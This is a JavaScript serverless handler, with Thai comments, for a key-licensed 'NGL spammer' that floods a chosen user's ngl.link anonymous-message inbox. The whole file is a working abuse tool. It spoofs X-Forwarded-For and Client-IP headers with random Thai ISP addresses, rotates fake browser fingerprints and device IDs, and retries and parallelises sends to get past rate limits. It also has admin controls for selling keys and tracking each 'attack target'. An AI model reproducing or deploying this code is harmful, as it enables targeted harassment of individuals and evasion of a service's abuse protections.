const FIREBASE_DB_URL = "https://shop-25ffb-default-rtdb.asia-southeast1.firebasedatabase.app";

async function getFirebaseKeys() {
    try {
        const res = await fetch(`${FIREBASE_DB_URL}/ngl_spammer_keys.json`);
        return await res.json() || {};
    } catch (e) { return {}; }
}
async function updateSingleKeyField(key, fields) {
    await fetch(`${FIREBASE_DB_URL}/ngl_spammer_keys/${key}.json`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(fields)
    });
}
async function updateFirebaseKeys(keys) {
    await fetch(`${FIREBASE_DB_URL}/ngl_spammer_keys.json`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(keys)
    });
}
async function getFirebaseBlacklist() {
    try {
        const res = await fetch(`${FIREBASE_DB_URL}/ngl_blacklist_users.json`);
        return await res.json() || {};
    } catch (e) { return {}; }
}
async function updateFirebaseBlacklist(list) {
    await fetch(`${FIREBASE_DB_URL}/ngl_blacklist_users.json`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(list)
    });
}

// 🌐 พูลสุ่ม IP ค่ายมือถือและเน็ตบ้านไทยพรีเมียม (AIS, True, DTAC, 3BB)
function generateAdvancedIP() {
    const pools = [
        [49, 228, 0, 255],   // AIS Mobile / Fibre
        [171, 96, 0, 254],   // TrueMove H / TrueOnline
        [182, 52, 0, 254],   // DTAC TriNet 
        [124, 120, 0, 254],  // NT / TOT โซนกรุงเทพ
        [180, 180, 0, 255]   // 3BB Broadband Thailand
    ];
    const base = pools[Math.floor(Math.random() * pools.length)];
    return `${base[0]}.${base[1]}.${Math.floor(Math.random() * (base[3] - base[2] + 1)) + base[2]}.${Math.floor(Math.random() * 254) + 1}`;
}

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ error: 'รูปแบบไม่ถูกต้อง' });

    try {
        const { action, username, question, deviceId, key, targetKey, targetUser, requestedMode, isFirstPacket } = req.body;

        let allowedKeys = await getFirebaseKeys();
        let blacklistUsers = await getFirebaseBlacklist();

        // ==========================================
        // 🛰️ แผงควบคุมระบบ (ADMIN ZONE)
        // ==========================================
        if (action === 'admin_get_keys') {
            return res.status(200).json({ success: true, keys: allowedKeys, blacklist: blacklistUsers });
        }
        if (action === 'admin_add_key') {
            allowedKeys[targetKey] = { usedBy: "none", isSpeedAllowed: false, isBlasting: false, currentAttackTarget: "-", lastMessageSent: "-", lastActiveTime: "-", forceStopRequested: false };
            await updateFirebaseKeys(allowedKeys);
            return res.status(200).json({ success: true, message: `➕ เพิ่มคีย์ [ ${targetKey} ] สำเร็จ` });
        }
        if (action === 'admin_toggle_speed') {
            if (allowedKeys[targetKey]) {
                const cur = allowedKeys[targetKey].isSpeedAllowed || false;
                await updateSingleKeyField(targetKey, { isSpeedAllowed: !cur });
                return res.status(200).json({ success: true, message: `⚡ คีย์ [ ${targetKey} ] โหมดเร็ว: ${!cur ? 'เปิด' : 'ปิด'}` });
            }
            return res.status(404).json({ error: 'ไม่พบคีย์' });
        }
        if (action === 'admin_delete_key') {
            if (allowedKeys[targetKey]) { delete allowedKeys[targetKey]; await updateFirebaseKeys(allowedKeys); }
            return res.status(200).json({ success: true, message: `❌ ลบคีย์ถาวรแล้ว` });
        }
        if (action === 'admin_reset_key') {
            if (allowedKeys[targetKey]) {
                await updateSingleKeyField(targetKey, { usedBy: "none", forceStopRequested: false, isBlasting: false, currentAttackTarget: "-" });
            }
            return res.status(200).json({ success: true, message: `🔄 รีเซ็ตคีย์สำเร็จ` });
        }
        if (action === 'admin_force_stop') {
            if (allowedKeys[targetKey]) {
                await updateSingleKeyField(targetKey, { forceStopRequested: true, isBlasting: false, currentAttackTarget: "🛑 สั่งระงับการยิง" });
                return res.status(200).json({ success: true, message: `🛑 สั่งหยุดยิงคีย์ [ ${targetKey} ] เรียบร้อย!` });
            }
            return res.status(404).json({ error: 'ไม่พบคีย์' });
        }
        if (action === 'admin_add_blacklist') {
            if(!targetUser) return res.status(400).json({ error: 'ระบุชื่อด้วยครับ' });
            blacklistUsers[targetUser.toLowerCase()] = true;
            await updateFirebaseBlacklist(blacklistUsers);
            return res.status(200).json({ success: true, message: `🚫 แบนไอดี @${targetUser}` });
        }
        if (action === 'admin_remove_blacklist') {
            if (blacklistUsers[targetUser.toLowerCase()]) { delete blacklistUsers[targetUser.toLowerCase()]; await updateFirebaseBlacklist(blacklistUsers); }
            return res.status(200).json({ success: true, message: `🔓 ปลดแบน @${targetUser}` });
        }
        if (action === 'client_finish') {
            if (allowedKeys[key]) { await updateSingleKeyField(key, { isBlasting: false, currentAttackTarget: "-" }); }
            return res.status(200).json({ success: true });
        }

        // ==========================================
        // 🔒 ตรวจสอบสิทธิ์ความปลอดภัย
        // ==========================================
        if (username && blacklistUsers[username.toLowerCase()]) {
            return res.status(403).json({ error: 'เป้าหมายนี้โดนแบนในระบบ' });
        }

        const isPermanentKey = (key === 'admin' || key === 'mhon');
        let keyData = allowedKeys[key];

        if (!isPermanentKey) {
            if (!keyData) return res.status(403).json({ error: 'คีย์ไม่ถูกต้อง' });
            
            if (keyData.forceStopRequested === true || keyData.forceStopRequested === "true") {
                return res.status(200).json({ forceStopped: true, error: 'โดนแอดมินตัดสัญญาณ' });
            }
            if (requestedMode === 'cyber' && !keyData.isSpeedAllowed) {
                return res.status(403).json({ error: 'ไม่มีสิทธิ์ใช้โหมดเร็ว' });
            }
            if (keyData.usedBy && keyData.usedBy !== "none" && keyData.usedBy !== deviceId) {
                return res.status(403).json({ error: 'คีย์นี้ถูกล็อกใช้กับเครื่องอื่นอยู่' });
            }
            if (!keyData.usedBy || keyData.usedBy === "none") {
                await updateSingleKeyField(key, { usedBy: deviceId });
            }
        }

        const cleanUsername = username.trim().replace('https://ngl.link/', '');
        const timeString = new Date().toLocaleTimeString('th-TH', { timeZone: 'Asia/Bangkok' });

        if (!isPermanentKey && (isFirstPacket || keyData.currentAttackTarget !== cleanUsername)) {
            await updateSingleKeyField(key, {
                isBlasting: true,
                currentAttackTarget: cleanUsername,
                lastMessageSent: question || '',
                lastActiveTime: timeString,
                forceStopRequested: false 
            });
        }

        // ==========================================
        // 🛡️ คลังแสงจำลองข้อมูลเครื่องจริงระดับสูง (Advanced Anti-Fingerprint Zone)
        // ==========================================
        const browserPool = [
            {
                ua: 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1',
                plat: '"iOS"', brand: '"Safari";v="18"'
            },
            {
                ua: 'Mozilla/5.0 (Linux; Android 15; SM-S938B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36',
                plat: '"Android"', brand: '"Google Chrome";v="140"'
            },
            {
                ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
                plat: '"Windows"', brand: '"Google Chrome";v="141"'
            },
            {
                ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15',
                plat: '"macOS"', brand: '"Safari";v="17"'
            }
        ];

        // 🚀 ฟังก์ชันยิงพัสดุขนานพร้อมระบบ Auto-Retry ภายในทองคำ (Max 2 Attempts)
        const sendPacketWithRetry = async () => {
            let attempt = 0;
            const maxAttempts = 2; // ถ้ายิงนัดแรกพลาด จะสร้าง IP ใหม่และซ้ำให้ทันทีอีก 1 รอบเพื่อกลบเกลื่อน Error
            
            while (attempt < maxAttempts) {
                try {
                    const spoofedIP = generateAdvancedIP();
                    const browser = browserPool[Math.floor(Math.random() * browserPool.length)];
                    const fakeBoundaryId = 'MCH_SPOOF_' + Math.random().toString(36).substring(2, 10).toUpperCase();
                    const rawBody = `username=${encodeURIComponent(cleanUsername)}&question=${encodeURIComponent(question || '')}&deviceId=${encodeURIComponent(fakeBoundaryId)}&gameSlug=&referrer=`;

                    const response = await fetch('https://ngl.link/api/submit', {
                        method: 'POST',
                        headers: {
                            'accept': '*/*',
                            'accept-language': 'th-TH,th;q=0.9,en;q=0.8',
                            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                            'user-agent': browser.ua,
                            'origin': 'https://ngl.link',
                            'referer': `https://ngl.link/${encodeURIComponent(cleanUsername)}`,
                            'X-Forwarded-For': spoofedIP,
                            'Client-IP': spoofedIP,
                            'sec-ch-ua-platform': browser.plat,
                            'sec-ch-ua': `${browser.brand}, "Not=A?Brand";v="99"`,
                            'X-Requested-With': 'XMLHttpRequest'
                        },
                        body: rawBody,
                        signal: AbortSignal.timeout(3500) // ขยายเวลาหน่วงเครือข่ายเป็น 3.5 วินาที เก็บตกแพ็กเก็ตช้า
                    });

                    if (response.ok) {
                        return true; // สำเร็จหลุดลูปทันที
                    }
                } catch (e) {
                    // หาก timeout หรือหลุดเครือข่าย ให้ขยับลูปไปยิงรอบแก้ตัว
                }
                attempt++;
            }
            return false; // พลาดครบทุกรอบจริง ๆ ถึงจะยอมรับผล
        };

        // สั่งระเบิดสปีดขนาน 4 ขาตามโครงสร้างเดิม
        if (requestedMode === 'cyber') {
            Promise.all([sendPacketWithRetry(), sendPacketWithRetry(), sendPacketWithRetry(), sendPacketWithRetry()]).catch(() => {});
            return res.status(200).json({ success: true, speed: "ultra_boosted" });
        }

        // โหมดธรรมดาก็ใส่ระบบช่วยยิงซ้ำเช่นกันเพื่อความนิ่ง
        const successNormal = await sendPacketWithRetry();
        if (successNormal) {
            return res.status(200).json({ success: true });
        } else {
            return res.status(429).json({ error: `NGL ตรวจจับพิกัดแน่นหนา` });
        }

    } catch (error) {
        return res.status(500).json({ error: 'หลบ Firewall' });
    }
}

